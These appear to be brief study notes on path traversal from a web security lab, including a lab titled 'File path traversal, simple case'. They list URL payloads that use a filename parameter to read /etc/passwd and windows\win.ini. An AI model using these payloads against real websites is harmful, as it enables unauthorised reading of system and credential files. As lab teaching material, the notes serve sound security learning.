## Reading arbitrary files via path traversal

`https://insecure-website.com/loadImage?filename=../../../etc/passwd`  
`https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`

## Lab: File path traversal, simple case
`/image?filename=../../../etc/passwd`